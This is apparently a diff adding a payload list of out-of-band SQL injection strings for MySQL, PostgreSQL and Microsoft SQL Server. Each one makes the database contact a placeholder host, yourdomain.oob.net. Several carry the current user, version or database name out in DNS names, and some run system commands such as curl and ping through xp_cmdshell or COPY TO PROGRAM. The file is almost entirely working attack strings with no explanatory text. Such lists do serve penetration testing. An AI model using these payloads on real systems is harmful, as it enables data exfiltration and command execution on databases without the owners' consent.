@@ -1,0 +1,30 @@
+MySQL
+
+SELECT LOAD_FILE('\\\\yourdomain.oob.net\\test');
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.yourdomain.oob.net\\'));
+SELECT INTO OUTFILE '\\\\yourdomain.oob.net\\test';
+SELECT ... WHERE 1=1 AND EXTRACTVALUE(1, CONCAT('~',(SELECT user()),'~')) INTO OUTFILE '//yourdomain.oob.net/test';
+SELECT ... WHERE 1=1 AND EXTRACTVALUE(1, CONCAT('~',(SELECT @@version),'~')) INTO DUMPFILE '//yourdomain.oob.net/foo';
+
+PostgreSQL
+
+COPY (SELECT '') TO PROGRAM 'curl http://yourdomain.oob.net/';
+COPY (SELECT '') TO PROGRAM 'ping -c 1 yourdomain.oob.net';
+SELECT dblink_connect('host=yourdomain.oob.net user=postgres');
+SELECT dblink_connect('dbname=postgres host=yourdomain.oob.net port=80 user=postgres');
+
+Microsoft SQL Server
+
+exec master..xp_dirtree '\\yourdomain.oob.net\test';
+exec master..xp_fileexist '\\yourdomain.oob.net\test';
+exec master..xp_cmdshell 'ping yourdomain.oob.net';
+exec master..xp_cmdshell 'nslookup yourdomain.oob.net';
+exec master..xp_cmdshell 'curl http://yourdomain.oob.net/';
+
+Mixed / Advanced / Generic
+
+(SELECT 1 FROM OPENROWSET('MSDASQL', 'DRIVER={SQL Server};SERVER=yourdomain.oob.net;', 'SELECT 1'))
+LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.yourdomain.oob.net\\foo'))
+' OR LOAD_FILE('\\\\yourdomain.oob.net\\foo') --
+'; exec xp_dirtree ('\\\\yourdomain.oob.net\\test') --
+1) OR 1=1; exec master..xp_cmdshell 'ping yourdomain.oob.net' --
